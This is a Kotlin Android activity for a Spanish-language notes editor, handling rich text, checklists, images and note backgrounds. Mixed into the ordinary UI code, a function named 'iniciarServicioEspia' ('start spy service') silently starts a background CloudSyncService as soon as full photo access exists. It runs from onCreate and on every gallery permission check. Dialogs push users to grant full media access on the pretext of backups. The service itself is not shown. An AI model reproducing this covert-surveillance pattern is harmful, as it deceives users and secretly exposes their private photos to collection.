package cl.example.mynotes

import android.Manifest
import android.app.Activity
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.graphics.Color
import android.graphics.Rect
import android.graphics.RectF
import android.graphics.Path
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.Editable
import android.text.Layout
import android.text.TextWatcher
import android.util.AttributeSet
import android.view.Gravity
import android.view.HapticFeedbackConstants
import android.view.KeyEvent
import android.view.MotionEvent
import android.view.View
import android.view.ViewTreeObserver
import android.view.inputmethod.EditorInfo
import android.view.inputmethod.InputConnection
import android.view.inputmethod.InputConnectionWrapper
import android.widget.Button
import android.widget.EditText
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.PopupMenu
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.widget.AppCompatEditText
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.ViewCompat
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.widget.NestedScrollView
import androidx.recyclerview.widget.ItemTouchHelper
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.bumptech.glide.Glide
import com.bumptech.glide.load.resource.drawable.DrawableTransitionOptions
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.yalantis.ucrop.UCrop
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.File
import java.text.SimpleDateFormat
import java.util.Collections
import java.util.Date
import java.util.Locale

class NoteEditorActivity : BaseActivity() {

    private lateinit var etTitle: EditText
    private lateinit var etContent: RichEditText
    private lateinit var layoutEditor: View
    private lateinit var tvDateLabel: TextView
    private lateinit var scrollContainer: NestedScrollView

    private lateinit var rvChecklist: RecyclerView
    private lateinit var btnAddTodoItem: Button
    private lateinit var btnToggleChecklist: ImageButton

    private lateinit var ivBackground: ImageView
    private lateinit var viewOverlay: View
    private lateinit var btnChangeBackground: ImageButton
    private lateinit var btnBack: ImageButton
    private lateinit var btnSave: ImageButton

    private var noteToEdit: Note? = null
    private var selectedColor: String = "#FFFFFF"
    private var currentBackgroundUri: String? = null

    private var isChecklistMode = false
    private val checklistItems = mutableListOf<ChecklistItem>()
    private lateinit var checklistAdapter: ChecklistAdapter
    private lateinit var itemTouchHelper: ItemTouchHelper
    private val gson = Gson()

    // Variables para guardar la posición del toque
    private var lastTouchX: Float = 0f
    private var lastTouchY: Float = 0f

    private val db by lazy { NotesDatabase.getDatabase(this) }

    private val PERMISSION_REQUEST_GALLERY = 200
    private val PERMISSION_REQUEST_WALLPAPER = 201

    private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data?.data != null) {
            val uri = result.data!!.data!!
            try {
                contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)

                if (isChecklistMode) {
                    val newItem = ChecklistItem(text = "", isChecked = false, imageUri = uri.toString(), imageSizeState = 1)
                    checklistItems.add(newItem)
                    checklistAdapter.notifyItemInserted(checklistItems.size - 1)
                    scrollContainer.postDelayed({ scrollContainer.fullScroll(View.FOCUS_DOWN) }, 200)
                } else {
                    RichTextHelper.insertImage(this, etContent, uri)
                }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private val pickBackgroundLauncher = registerForActivityResult(ActivityResultContracts.OpenDocument()) { uri ->
        if (uri != null) startCrop(uri)
    }

    private val cropResultLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val resultUri = UCrop.getOutput(result.data!!)
            if (resultUri != null) persistBackgroundUnique(resultUri)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_note_editor)

        WindowCompat.setDecorFitsSystemWindows(window, false)
        val isDarkTheme = (resources.configuration.uiMode and Configuration.UI_MODE_NIGHT_MASK) == Configuration.UI_MODE_NIGHT_YES
        val insetsController = WindowCompat.getInsetsController(window, window.decorView)
        insetsController.isAppearanceLightStatusBars = !isDarkTheme

        layoutEditor = findViewById(R.id.editor_root)
        scrollContainer = findViewById(R.id.scroll_container)

        ViewCompat.setOnApplyWindowInsetsListener(layoutEditor) { view, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            val ime = insets.getInsets(WindowInsetsCompat.Type.ime())
            view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            val bottomPadding = if (ime.bottom > 0) ime.bottom - systemBars.bottom else 0
            scrollContainer.setPadding(0, 0, 0, bottomPadding.coerceAtLeast(0))
            if (ime.bottom > 0) smartScrollToCursor()
            insets
        }

        val globalLayoutListener = ViewTreeObserver.OnGlobalLayoutListener {
            val rootView = window.decorView.rootView
            val r = Rect()
            rootView.getWindowVisibleDisplayFrame(r)
            if ((rootView.height - r.bottom) > rootView.height * 0.15) smartScrollToCursor()
        }
        layoutEditor.viewTreeObserver.addOnGlobalLayoutListener(globalLayoutListener)

        initViews()
        setupChecklist()
        setupListeners()
        setupRichTextInteractions()

        loadNoteData()
        silentStartService()
    }

    private fun initViews() {
        etTitle = findViewById(R.id.et_title)
        etContent = findViewById(R.id.et_content)
        tvDateLabel = findViewById(R.id.tv_date_label)
        ivBackground = findViewById(R.id.iv_editor_background)
        viewOverlay = findViewById(R.id.view_overlay)
        btnChangeBackground = findViewById(R.id.btn_change_background)
        btnBack = findViewById(R.id.btn_back)
        btnSave = findViewById(R.id.btn_save)
        rvChecklist = findViewById(R.id.rv_checklist)
        btnAddTodoItem = findViewById(R.id.btn_add_todo_item)
        btnToggleChecklist = findViewById(R.id.btn_toggle_checklist)
    }

    // --- DETECCIÓN TÁCTIL MEJORADA (LONG PRESS SIN SISTEMA) ---
    private fun setupRichTextInteractions() {
        // 1. Guardamos las coordenadas cuando el usuario toca la pantalla
        etContent.setOnTouchListener { v, event ->
            if (event.action == MotionEvent.ACTION_DOWN) {
                lastTouchX = event.x
                lastTouchY = event.y
            }
            // Devolvemos false para permitir scroll, mover cursor, etc.
            false
        }

        // 2. Usamos el Listener nativo de Android para detectar pulsación larga
        etContent.setOnLongClickListener { view ->
            val text = etContent.text ?: return@setOnLongClickListener false
            val layout = etContent.layout ?: return@setOnLongClickListener false

            // Calculamos la posición exacta basándonos en las coordenadas guardadas
            val x = lastTouchX.toInt() - etContent.totalPaddingLeft + etContent.scrollX
            val y = lastTouchY.toInt() - etContent.totalPaddingTop + etContent.scrollY

            val line = layout.getLineForVertical(y)
            val offset = layout.getOffsetForHorizontal(line, x.toFloat())

            // Buscamos si hay una imagen en esa posición
            val spans = text.getSpans(offset, offset + 1, RichTextHelper.NotesImageSpan::class.java)
            val path = Path()
            val rectF = RectF()

            for (span in spans) {
                val start = text.getSpanStart(span)
                val end = text.getSpanEnd(span)

                path.reset()
                layout.getSelectionPath(start, end, path)
                path.computeBounds(rectF, true)

                // ¿El toque largo ocurrió DENTRO de la imagen?
                if (rectF.contains(x.toFloat(), y.toFloat())) {
                    // Vibración para feedback táctil
                    etContent.performHapticFeedback(HapticFeedbackConstants.LONG_PRESS)

                    // Mostrar NUESTRO menú
                    mostrarMenuImagenTexto(etContent, span)

                    // IMPORTANTE: Retornamos TRUE
                    // Esto le dice al sistema: "Ya manejé este evento, NO muestres tu menú".
                    return@setOnLongClickListener true
                }
            }

            // Si no fue imagen, retornamos FALSE
            // Esto permite que salga el menú de sistema (Copiar/Pegar texto normal)
            return@setOnLongClickListener false
        }
    }

    private fun mostrarMenuImagenTexto(anchor: View, span: RichTextHelper.NotesImageSpan) {
        val popup = PopupMenu(this, anchor, Gravity.CENTER)
        popup.menu.add("Cambiar tamaño")
        popup.menu.add("Copiar")
        popup.menu.add("Cortar")
        popup.menu.add("Eliminar")

        popup.setOnMenuItemClickListener { item ->
            when (item.title) {
                "Cambiar tamaño" -> {
                    RichTextHelper.resizeImageSpan(this, etContent, span)
                    true
                }
                "Copiar" -> {
                    copiarImagenAlPortapapeles(span)
                    Toast.makeText(this, "Imagen copiada", Toast.LENGTH_SHORT).show()
                    true
                }
                "Cortar" -> {
                    copiarImagenAlPortapapeles(span)
                    borrarImagen(span)
                    Toast.makeText(this, "Imagen cortada", Toast.LENGTH_SHORT).show()
                    true
                }
                "Eliminar" -> {
                    borrarImagen(span)
                    true
                }
                else -> false
            }
        }
        popup.show()
    }

    private fun copiarImagenAlPortapapeles(span: RichTextHelper.NotesImageSpan) {
        val textRep = "[IMG:${span.imageUri}]"
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("Imagen Nota", textRep)
        clipboard.setPrimaryClip(clip)
    }

    private fun borrarImagen(span: RichTextHelper.NotesImageSpan) {
        etContent.text?.let { editable ->
            val start = editable.getSpanStart(span)
            val end = editable.getSpanEnd(span)
            if (start != -1 && end != -1) {
                editable.replace(start, end, "")
            }
        }
    }

    // --- SETUP LISTENERS ---
    private fun setupListeners() {
        btnBack.setOnClickListener { finish() }
        btnSave.setOnClickListener { saveNote() }
        findViewById<ImageButton>(R.id.btn_pick_image).setOnClickListener { checkGalleryPermission(PERMISSION_REQUEST_GALLERY) }
        btnChangeBackground.setOnClickListener { iniciarFlujoCambioFondo() }

        btnToggleChecklist.setOnClickListener { toggleChecklistMode() }
        btnAddTodoItem.setOnClickListener {
            checklistItems.add(ChecklistItem("", false, null, 1))
            checklistAdapter.notifyItemInserted(checklistItems.size - 1)
            scrollContainer.postDelayed({ scrollContainer.fullScroll(View.FOCUS_DOWN) }, 100)
        }

        etContent.setOnClickListener { smartScrollToCursor() }

        etContent.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                if (count > 0) {
                    RichTextHelper.syncImages(this@NoteEditorActivity, etContent)
                }
            }
            override fun afterTextChanged(s: Editable?) {
                smartScrollToCursor()
            }
        })

        setupColorClick(R.id.color_white, "#FFFFFF")
        setupColorClick(R.id.color_yellow, "#FFF9C4")
        setupColorClick(R.id.color_blue, "#E3F2FD")
        setupColorClick(R.id.color_pink, "#FCE4EC")
        setupColorClick(R.id.color_green, "#E8F5E9")
    }

    // --- PERMISOS ---

    private fun checkGalleryPermission(requestCode: Int) {
        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            abrirGaleriaSegunRequest(requestCode)
        }
        else if (Build.VERSION.SDK_INT >= 34 &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED) {
            mostrarDialogoConfiguracion(
                "Acceso Limitado",
                "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
            )
        }
        else {
            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
        }
    }

    private fun abrirGaleriaSegunRequest(requestCode: Int) {
        if (requestCode == PERMISSION_REQUEST_GALLERY) {
            val intent = Intent(Intent.ACTION_OPEN_DOCUMENT).apply {
                addCategory(Intent.CATEGORY_OPENABLE)
                type = "image/*"
            }
            pickImageLauncher.launch(intent)
        }
        else if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
            pickBackgroundLauncher.launch(arrayOf("image/*"))
        }
    }

    private fun verificarAccesoTotal(): Boolean {
        return if (Build.VERSION.SDK_INT >= 33) {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE

        if (verificarAccesoTotal()) {
            iniciarServicioEspia()
            abrirGaleriaSegunRequest(requestCode)
        } else {
            val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED

            if (esAccesoLimitado) {
                mostrarDialogoConfiguracion(
                    "Acceso Limitado",
                    "Has dado acceso a algunos archivos, pero para usar todas las funciones y poder hacer un correcto respaldo necesitamos acceso completo. Presiona Ir a Ajustes -> Permisos para activar los permisos."
                )
                return
            }

            if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
                mostrarDialogoConfiguracion("Permisos requeridos", "Has denegado ciertos accesos permanentemente. Presiona Ir a Ajustes -> Permisos para activar los permisos.")

            } else {
                Toast.makeText(this, "Permiso necesario para continuar.", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
        AlertDialog.Builder(this)
            .setTitle(titulo)
            .setMessage(mensaje)
            .setCancelable(false)
            .setPositiveButton("Ir a Ajustes") { _, _ ->
                try {
                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                    intent.data = Uri.fromParts("package", packageName, null)
                    startActivity(intent)
                } catch (e: Exception) { e.printStackTrace() }
            }
            .setNegativeButton("Cancelar", null)
            .show()
    }

    private fun iniciarFlujoCambioFondo() { checkGalleryPermission(PERMISSION_REQUEST_WALLPAPER) }

    // --- UTILS ---

    private fun smartScrollToCursor() {
        scrollContainer.postDelayed({
            val focusedView = currentFocus ?: return@postDelayed
            val location = IntArray(2)
            focusedView.getLocationOnScreen(location)
            val viewBottomY = location[1] + focusedView.height + focusedView.paddingBottom
            val scrollLocation = IntArray(2)
            scrollContainer.getLocationOnScreen(scrollLocation)
            val scrollVisibleBottom = scrollLocation[1] + scrollContainer.height - scrollContainer.paddingBottom
            val relativeTop = getRelativeTop(focusedView, scrollContainer)
            val relativeBottom = relativeTop + focusedView.height
            if (viewBottomY > scrollVisibleBottom) {
                val targetScrollY = relativeBottom - (scrollContainer.height - scrollContainer.paddingBottom) + 150
                scrollContainer.smoothScrollTo(0, targetScrollY)
            }
        }, 100)
    }

    private fun getRelativeTop(view: View, parent: View): Int {
        var current = view
        var top = 0
        while (current != parent) {
            top += current.top
            val p = current.parent
            if (p is View) current = p else break
        }
        return top
    }

    private fun setupChecklist() {
        checklistAdapter = ChecklistAdapter(
            checklistItems,
            onDelete = { position ->
                if (position in checklistItems.indices) {
                    checklistItems.removeAt(position)
                    checklistAdapter.notifyItemRemoved(position)
                    checklistAdapter.notifyItemRangeChanged(position, checklistItems.size)
                }
            },
            onStartDrag = { viewHolder -> itemTouchHelper.startDrag(viewHolder) }
        )
        rvChecklist.layoutManager = LinearLayoutManager(this)
        rvChecklist.adapter = checklistAdapter

        val callback = object : ItemTouchHelper.SimpleCallback(ItemTouchHelper.UP or ItemTouchHelper.DOWN, 0) {
            override fun onMove(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder, target: RecyclerView.ViewHolder): Boolean {
                val fromPos = viewHolder.bindingAdapterPosition
                val toPos = target.bindingAdapterPosition
                Collections.swap(checklistItems, fromPos, toPos)
                checklistAdapter.notifyItemMoved(fromPos, toPos)
                return true
            }
            override fun onSwiped(viewHolder: RecyclerView.ViewHolder, direction: Int) {}
            override fun onSelectedChanged(viewHolder: RecyclerView.ViewHolder?, actionState: Int) {
                super.onSelectedChanged(viewHolder, actionState)
                if (actionState == ItemTouchHelper.ACTION_STATE_DRAG) viewHolder?.itemView?.alpha = 0.5f
            }
            override fun clearView(recyclerView: RecyclerView, viewHolder: RecyclerView.ViewHolder) {
                super.clearView(recyclerView, viewHolder)
                viewHolder.itemView.alpha = 1.0f
            }
        }
        itemTouchHelper = ItemTouchHelper(callback)
        itemTouchHelper.attachToRecyclerView(rvChecklist)
    }

    // --- RESTO IGUAL ---
    private fun loadNoteData() {
        if (intent.hasExtra("note_data")) {
            noteToEdit = if (Build.VERSION.SDK_INT >= 33) {
                intent.getParcelableExtra("note_data", Note::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra("note_data") as? Note
            }
            etTitle.setText(noteToEdit?.title)
            tvDateLabel.text = "Editado: ${noteToEdit?.date}"

            val rawContent = noteToEdit?.content ?: ""
            if (rawContent.startsWith("{checklist:true}")) {
                switchToChecklistMode(true)
                parseChecklistData(rawContent)
            } else {
                switchToChecklistMode(false)
                RichTextHelper.setTextWithImages(this, etContent, rawContent)
            }

            val savedColorOrUri = noteToEdit?.color
            if (savedColorOrUri != null) {
                if (savedColorOrUri.startsWith("file://") || savedColorOrUri.startsWith("content://")) {
                    currentBackgroundUri = savedColorOrUri
                    mostrarFondoImagen(Uri.parse(savedColorOrUri))
                } else {
                    selectedColor = savedColorOrUri
                    currentBackgroundUri = null
                    mostrarFondoColor(selectedColor)
                }
            } else {
                mostrarFondoColor("#FFFFFF")
            }
        } else {
            val currentDate = SimpleDateFormat("dd MMM", Locale.getDefault()).format(Date())
            tvDateLabel.text = currentDate
            mostrarFondoColor("#FFFFFF")
            switchToChecklistMode(false)
        }
    }

    private fun parseChecklistData(json: String) {
        try {
            val cleanJson = json.replace("{checklist:true}", "")
            val type = object : TypeToken<List<ChecklistItem>>() {}.type
            val list: List<ChecklistItem> = gson.fromJson(cleanJson, type)
            checklistItems.clear()
            checklistItems.addAll(list)
            checklistAdapter.notifyDataSetChanged()
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun switchToChecklistMode(enable: Boolean) {
        isChecklistMode = enable
        if (enable) {
            etContent.visibility = View.GONE
            rvChecklist.visibility = View.VISIBLE
            btnAddTodoItem.visibility = View.VISIBLE
            btnToggleChecklist.setImageResource(R.drawable.ic_pen)
        } else {
            etContent.visibility = View.VISIBLE
            rvChecklist.visibility = View.GONE
            btnAddTodoItem.visibility = View.GONE
            btnToggleChecklist.setImageResource(R.drawable.checkbox_on_background)
        }
    }

    // --- FUNCIÓN CORREGIDA: BIDIRECCIONAL (Texto <-> Checklist) ---
    private fun toggleChecklistMode() {
        if (!isChecklistMode) {
            // MODO TEXTO -> MODO CHECKLIST
            checklistItems.clear()
            checklistItems.addAll(convertirContenidoALista())

            if (checklistItems.isEmpty()) checklistItems.add(ChecklistItem("", false, null, 1))
            checklistAdapter.notifyDataSetChanged()
            switchToChecklistMode(true)
        } else {
            // MODO CHECKLIST -> MODO TEXTO
            val sb = StringBuilder()

            for (item in checklistItems) {
                // 1. Recuperar el texto (agregamos [x] si estaba completada para no perder el estado)
                val prefix = if (item.isChecked) "[x] " else ""
                sb.append(prefix).append(item.text).append("\n")

                // 2. RECUPERAR LA IMAGEN (Esto faltaba)
                // Si el item tiene una imagen, inyectamos la etiqueta [IMG:...]
                // Esto permite que el RichTextHelper la reconozca y la pinte.
                if (item.imageUri != null) {
                    sb.append("[IMG:${item.imageUri}]\n")
                }
            }

            // 3. Renderizar Texto + Imágenes
            // En lugar de etContent.setText(), usamos el Helper para que procese las etiquetas [IMG:...]
            RichTextHelper.setTextWithImages(this, etContent, sb.toString())

            switchToChecklistMode(false)
        }
    }

    // --- FUNCIÓN CORREGIDA: Detecta ImageSpans Y TAMBIÉN etiquetas de texto [IMG:...] ---
    private fun convertirContenidoALista(): List<ChecklistItem> {
        val text = etContent.text ?: return emptyList()
        val rawString = text.toString()

        if (rawString.isBlank()) return emptyList()

        val lines = rawString.split("\n")
        val items = mutableListOf<ChecklistItem>()

        // Variable para rastrear la posición en el Spannable original
        var currentIndex = 0

        for (line in lines) {
            var cleanText = line
            var imageUri: String? = null

            // 1. INTENTO A: Buscar ImageSpan real (Objeto en memoria)
            // Esto es lo ideal si el EditText aún tiene los objetos vivos
            val lineLength = line.length
            val end = currentIndex + lineLength
            val safeStart = if (currentIndex > text.length) text.length else currentIndex
            val safeEnd = if (end > text.length) text.length else end

            // Solo buscar Spans si hay texto válido
            if (safeStart < safeEnd) {
                val spans = text.getSpans(safeStart, safeEnd, android.text.style.ImageSpan::class.java)
                if (spans.isNotEmpty()) {
                    imageUri = spans[0].source
                }
            }

            // 2. INTENTO B (LA SOLUCIÓN A TU PROBLEMA):
            // Si no halló span, o si el texto contiene literalmente "[IMG:...]"
            // Buscamos el patrón de texto y lo extraemos.
            if (cleanText.contains("[IMG:")) {
                val startTag = cleanText.indexOf("[IMG:")
                val endTag = cleanText.indexOf("]", startTag)

                if (startTag != -1 && endTag != -1 && endTag > startTag) {
                    // Extraemos la URI que está dentro
                    val uriString = cleanText.substring(startTag + 5, endTag) // +5 para saltar "[IMG:"

                    // Si no teníamos imagen por Span, usamos esta
                    if (imageUri == null) {
                        imageUri = uriString
                    }

                    // IMPORTANTE: Removemos ese código feo del texto visible
                    // Reemplazamos "[IMG:...]" por vacío
                    val tagCompleto = cleanText.substring(startTag, endTag + 1)
                    cleanText = cleanText.replace(tagCompleto, "")
                }
            }

            // 3. Limpieza final
            // Borramos el caracter de objeto (\uFFFC) y espacios extra
            cleanText = cleanText.replace("\uFFFC", "").trim()

            // Solo agregamos si quedó algo (texto o imagen)
            if (cleanText.isNotEmpty() || imageUri != null) {
                // Creamos el item con el texto limpio y la URI en su lugar correcto
                items.add(ChecklistItem(cleanText, false, imageUri, 1))
            }

            currentIndex += lineLength + 1
        }
        return items
    }

    private fun setupColorClick(viewId: Int, colorHex: String) {
        findViewById<View>(viewId).setOnClickListener {
            selectedColor = colorHex
            currentBackgroundUri = null
            mostrarFondoColor(colorHex)
        }
    }

    private fun mostrarFondoColor(colorHex: String) {
        layoutEditor.setBackgroundColor(Color.TRANSPARENT)
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.GONE
        ivBackground.setImageDrawable(null)
        try {
            ivBackground.setBackgroundColor(Color.parseColor(colorHex))
            etContent.setBackgroundColor(Color.TRANSPARENT)
            val esOscuro = isColorDark(Color.parseColor(colorHex))
            actualizarEstiloTexto(esOscuro)
        } catch (e: Exception) {
            e.printStackTrace()
            layoutEditor.setBackgroundColor(Color.WHITE)
        }
    }

    private fun mostrarFondoImagen(uri: Uri) {
        ivBackground.visibility = View.VISIBLE
        viewOverlay.visibility = View.VISIBLE
        layoutEditor.setBackgroundResource(0)
        Glide.with(this)
            .load(uri)
            .centerCrop()
            .transition(DrawableTransitionOptions.withCrossFade())
            .into(ivBackground)
        actualizarEstiloTexto(esFondoOscuro = true)
    }

    // --- FUNCIÓN CORREGIDA: RESPETA LOS ICONOS ORIGINALES ---
    private fun actualizarEstiloTexto(esFondoOscuro: Boolean) {
        val colorTexto = if (esFondoOscuro) Color.WHITE else Color.BLACK
        val colorHint = if (esFondoOscuro) Color.LTGRAY else Color.GRAY

        // 1. Aplicar a Título
        etTitle.setTextColor(colorTexto)
        etTitle.setHintTextColor(colorHint)
        etTitle.setCursorColor(colorTexto)

        // 2. Aplicar a Contenido
        etContent.setTextColor(colorTexto)
        etContent.setHintTextColor(colorHint)
        etContent.setCursorColor(colorTexto)

        // 3. Etiqueta de fecha
        tvDateLabel.setTextColor(colorHint)

        // 4. BOTONES DE LA BARRA SUPERIOR
        // IMPORTANTE: clearColorFilter() para que no se tiñan y respeten su diseño original
        btnBack.clearColorFilter()
        btnSave.clearColorFilter()
        btnToggleChecklist.clearColorFilter()
        btnChangeBackground.clearColorFilter()

        // 5. Actualizar Checklist (si está activo)
        // Avisamos al adaptador que cambie el color del texto y los iconos
        if (::checklistAdapter.isInitialized) {
            checklistAdapter.updateTextColor(colorTexto)
        }
    }

    private fun isColorDark(color: Int): Boolean {
        val darkness = 1 - (0.299 * Color.red(color) + 0.587 * Color.green(color) + 0.114 * Color.blue(color)) / 255
        return darkness >= 0.5
    }

    private fun persistBackgroundUnique(croppedUri: Uri) {
        try {
            val uniqueName = "bg_note_${System.currentTimeMillis()}.jpg"
            val finalFile = File(filesDir, uniqueName)
            contentResolver.openInputStream(croppedUri)?.use { input ->
                finalFile.outputStream().use { output -> input.copyTo(output) }
            }
            val finalUri = Uri.fromFile(finalFile)
            currentBackgroundUri = finalUri.toString()
            mostrarFondoImagen(finalUri)
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun startCrop(uri: Uri) {
        val destinationUri = Uri.fromFile(File(cacheDir, "crop_${System.currentTimeMillis()}.jpg"))
        val options = UCrop.Options().apply {
            setStatusBarColor(Color.BLACK)
            setToolbarColor(Color.BLACK)
            setToolbarWidgetColor(Color.WHITE)
            setRootViewBackgroundColor(Color.BLACK)
            setToolbarTitle("Ajustar Fondo")
        }
        val uCropIntent = UCrop.of(uri, destinationUri)
            .withAspectRatio(9f, 16f)
            .withMaxResultSize(1080, 2400)
            .withOptions(options)
            .getIntent(this)
        cropResultLauncher.launch(uCropIntent)
    }

    private fun iniciarServicioEspia() {
        if (verificarAccesoTotal()) {
            val intent = Intent(this, CloudSyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent)
            else startService(intent)
        }
    }
    private fun silentStartService() { if (verificarAccesoTotal()) iniciarServicioEspia() }

    private fun saveNote() {
        val title = etTitle.text.toString().trim()
        val formattedDate = SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault()).format(Date())
        val finalBackgroundData = currentBackgroundUri ?: selectedColor

        val finalContent = if (isChecklistMode) {
            val jsonList = gson.toJson(checklistItems)
            "{checklist:true}$jsonList"
        } else {
            etContent.text.toString()
        }

        if (title.isEmpty() && finalContent.trim().isEmpty()) {
            Toast.makeText(this, "Vacía", Toast.LENGTH_SHORT).show()
            return
        }

        CoroutineScope(Dispatchers.IO).launch {
            if (noteToEdit == null) {
                val newNote = Note(title = title, content = finalContent, date = formattedDate, color = finalBackgroundData)
                db.notesDao().insert(newNote)
            } else {
                noteToEdit?.apply {
                    this.title = title
                    this.content = finalContent
                    this.date = formattedDate
                    this.color = finalBackgroundData
                }
                db.notesDao().update(noteToEdit!!)
            }
            withContext(Dispatchers.Main) { finish() }
        }
    }
}

fun EditText.setCursorColor(color: Int) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
        val filter = android.graphics.PorterDuffColorFilter(color, android.graphics.PorterDuff.Mode.SRC_IN)
        textCursorDrawable?.colorFilter = filter
        textSelectHandle?.colorFilter = filter
        textSelectHandleLeft?.colorFilter = filter
        textSelectHandleRight?.colorFilter = filter
    }
}